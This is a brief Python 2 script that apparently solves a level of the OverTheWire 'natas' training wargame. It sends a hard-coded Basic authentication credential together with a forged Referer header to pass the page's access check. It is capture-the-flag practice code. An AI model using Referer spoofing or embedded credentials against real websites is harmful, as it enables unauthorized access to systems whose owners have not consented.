#coding: utf-8
import urllib2

site = 'http://natas4.natas.labs.overthewire.org/'

opener = urllib2.build_opener()
opener.addheaders = [('Authorization','Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va'),
                     ('Referer','natas5.natas.labs.overthewire.org'),
                     ('User-agent','Mozilla/5.0')
                     ]

response = opener.open(site)
print response.read()
